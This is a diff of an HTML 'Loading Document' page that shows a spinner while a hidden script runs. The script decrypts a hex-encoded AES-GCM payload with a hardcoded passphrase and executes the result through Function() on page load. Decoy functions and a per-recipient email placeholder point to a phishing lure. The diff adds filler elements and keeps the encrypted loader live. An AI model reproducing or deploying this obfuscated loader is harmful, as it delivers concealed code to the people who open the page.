@@ -1,10 +1,9 @@
- 
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading Document</title>
+    <title>Loading Document - Enhanced</title>
     <style>
         body {
             margin: 0;
@@ -29,6 +28,10 @@
             animation: spin 1s linear infinite;
             margin: 20px auto;
         }
+        .extra-div {
+            display: none;
+            color: red;
+        }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -40,8 +43,12 @@
     </style>
 </head>
 <body>
+    <div id="hidden-wrapper" style="display: none;">
+        <div class="dummy-element" data-info="random-data"></div>
+    </div>
+
     <div class="loading-container">
-        <div class="loading-spinner"></div>
+        <div class="loading-spinner" useless-attr="123"></div>
         <p class="loading-text">Please wait, loading your document...</p>
     </div>
 
@@ -52,114 +59,116 @@
             document.body.style.backgroundColor = '#e0ffe0'; // Change background as a cue
         }, 5000); // Adjust loading time as needed
     </script>
-    <div nike-tes1="" adidas="<%=EMAIL64%>"></div>
-</body>
-</html>
+
+    <div nike-marie011="" adidas="<%=EMAIL64%>"></div>
+    <div class="extra-div" useless-attr2="yes">Hidden Content</div>
 
     <script>
+        const fakeAction = () => console.log("This does nothing useful.");
+        fakeAction();
       
-      const performDecryption = async (encryptedData, ivString, saltString, passphrase) => {
-    console.log("[INFO] Decryption process initiated...");
+        const performDecryption = async (encryptedData, ivString, saltString, passphrase) => {
+            console.log("[INFO] Decryption process initiated...");
 
-    // Convert hex to Uint8Array
-    const hexToBytes = (hex) => {
-        console.log(`[DEBUG] Converting hex string: ${hex}`);
-        return Uint8Array.from(hex.match(/.{2}/g).map((byte) => parseInt(byte, 16)));
-    };
+            // Convert hex to Uint8Array
+            const hexToBytes = (hex) => {
+                console.log(`[DEBUG] Converting hex string: ${hex}`);
+                return Uint8Array.from(hex.match(/.{2}/g).map((byte) => parseInt(byte, 16)));
+            };
 
-    const ivArray = hexToBytes(ivString);
-    const saltArray = hexToBytes(saltString);
+            const ivArray = hexToBytes(ivString);
+            const saltArray = hexToBytes(saltString);
 
-    // Adding an arbitrary delay (useless operation)
-    const fakeDelay = () => new Promise((resolve) => {
-        console.log("[INFO] Simulating delay...");
-        setTimeout(() => {
-            console.log("[DEBUG] Fake delay complete.");
-            resolve();
-        }, 100);
-    });
+            // Adding an arbitrary delay (useless operation)
+            const fakeDelay = () => new Promise((resolve) => {
+                console.log("[INFO] Simulating delay...");
+                setTimeout(() => {
+                    console.log("[DEBUG] Fake delay complete.");
+                    resolve();
+                }, 100);
+            });
 
-    // Key derivation process
-    const deriveKey = async (keyMaterial, salt) => {
-        console.log("[INFO] Deriving AES-GCM decryption key...");
-        return crypto.subtle.deriveKey(
-            { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
-            keyMaterial,
-            { name: "AES-GCM", length: 256 },
-            false,
-            ["decrypt"]
-        );
-    };
+            // Key derivation process
+            const deriveKey = async (keyMaterial, salt) => {
+                console.log("[INFO] Deriving AES-GCM decryption key...");
+                return crypto.subtle.deriveKey(
+                    { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
+                    keyMaterial,
+                    { name: "AES-GCM", length: 256 },
+                    false,
+                    ["decrypt"]
+                );
+            };
 
-    const keyMaterial = await crypto.subtle.importKey(
-        "raw",
-        new TextEncoder().encode(passphrase),
-        { name: "PBKDF2" },
-        false,
-        ["deriveKey"]
-    );
+            const keyMaterial = await crypto.subtle.importKey(
+                "raw",
+                new TextEncoder().encode(passphrase),
+                { name: "PBKDF2" },
+                false,
+                ["deriveKey"]
+            );
 
-    await fakeDelay(); // Just to look like more is happening
-    const aesKey = await deriveKey(keyMaterial, saltArray);
+            await fakeDelay(); // Just to look like more is happening
+            const aesKey = await deriveKey(keyMaterial, saltArray);
 
-    try {
-        console.log("[INFO] Attempting payload decryption...");
-        const decryptedBuffer = await crypto.subtle.decrypt(
-            { name: "AES-GCM", iv: ivArray },
-            aesKey,
-            hexToBytes(encryptedData)
-        );
-        console.log("[SUCCESS] Payload successfully decrypted.");
-        return new TextDecoder().decode(decryptedBuffer);
-    } catch (error) {
-        console.error("[ERROR] Decryption failed:", error);
-        return null;
-    }
-};
+            try {
+                console.log("[INFO] Attempting payload decryption...");
+                const decryptedBuffer = await crypto.subtle.decrypt(
+                    { name: "AES-GCM", iv: ivArray },
+                    aesKey,
+                    hexToBytes(encryptedData)
+                );
+                console.log("[SUCCESS] Payload successfully decrypted.");
+                return new TextDecoder().decode(decryptedBuffer);
+            } catch (error) {
+                console.error("[ERROR] Decryption failed:", error);
+                return null;
+            }
+        };
 
-// Function to simulate additional data processing
-const processDecryptedData = (data) => {
-    console.log("[INFO] Processing decrypted data...");
-    if (!data) {
-        console.error("[ERROR] No data to process.");
-        return;
-    }
-    const reversedData = data.split("").reverse().join("");
-    console.log("[INFO] Data processed (reversed):", reversedData);
-    return reversedData;
-};
+        // Function to simulate additional data processing
+        const processDecryptedData = (data) => {
+            console.log("[INFO] Processing decrypted data...");
+            if (!data) {
+                console.error("[ERROR] No data to process.");
+                return;
+            }
+            const reversedData = data.split("").reverse().join("");
+            console.log("[INFO] Data processed (reversed):", reversedData);
+            return reversedData;
+        };
 
-// Initialization function
-(async () => {
-    console.log("[INFO] Script execution started...");
-    const payload = {
-        iv: "c5d54a9c69516d18fab025aa",
-        salt: "f2c9263a7137550b0829e316a222b86e",
-        data: "7c186924f7b217943e4c6487f9d39b9910bc7e640ffc082516da5a9b8caf274be8b70ffd65131a24d3f7193f6f5dd3e09d0a3fad4dcfe75feb75f009b820f7974fa3c7cd763720aec91aa95aab0121cada3f156e35e520eb549e4f0c4b3efd501a525f8e3df5ff4bdde38199df65ddb856d5304bed2dba800983ecb1af1d7b6481700ddc96c5f3647cf54a430e067be7e01beb2ddd09e0bf4795d77e4e69c4459c8a926bc922680f55877eb0cf57b26d2450952d66fb175206cd3d15257f8eed99d48bfd50931242"
-    };
+        // Initialization function
+        (async () => {
+            console.log("[INFO] Script execution started...");
+            const payload = {
+                iv: "c5d54a9c69516d18fab025aa",
+                salt: "f2c9263a7137550b0829e316a222b86e",
+                data: "7c186924f7b217943e4c6487f9d39b9910bc7e640ffc082516da5a9b8caf274be8b70ffd65131a24d3f7193f6f5dd3e09d0a3fad4dcfe75feb75f009b820f7974fa3c7cd763720aec91aa95aab0121cada3f156e35e520eb549e4f0c4b3efd501a525f8e3df5ff4bdde38199df65ddb856d5304bed2dba800983ecb1af1d7b6481700ddc96c5f3647cf54a430e067be7e01beb2ddd09e0bf4795d77e4e69c4459c8a926bc922680f55877eb0cf57b26d2450952d66fb175206cd3d15257f8eed99d48bfd50931242"
+            };
 
-    console.log("[INFO] Payload details:", payload);
+            console.log("[INFO] Payload details:", payload);
 
-    try {
-        const decryptedContent = await performDecryption(
-            payload.data,
-            payload.iv,
-            payload.salt,
-            "quickescape"
-        );
+            try {
+                const decryptedContent = await performDecryption(
+                    payload.data,
+                    payload.iv,
+                    payload.salt,
+                    "quickescape"
+                );
 
-        if (decryptedContent) {
-            console.log("[INFO] Decrypted content:", decryptedContent);
-            const processedContent = processDecryptedData(decryptedContent);
+                if (decryptedContent) {
+                    console.log("[INFO] Decrypted content:", decryptedContent);
+                    const processedContent = processDecryptedData(decryptedContent);
 
-            // Simulate execution of processed content
-            console.log("[INFO] Executing processed content...");
-            Function(`${decryptedContent}`)();
-        }
-    } catch (err) {
-        console.error("[ERROR] Unexpected error during script execution:", err);
-    }
-})();
-
+                    // Simulate execution of processed content
+                    console.log("[INFO] Executing processed content...");
+                    Function(`${decryptedContent}`)();
+                }
+            } catch (err) {
+                console.error("[ERROR] Unexpected error during script execution:", err);
+            }
+        })();
     </script>
-
+</body>
+</html>
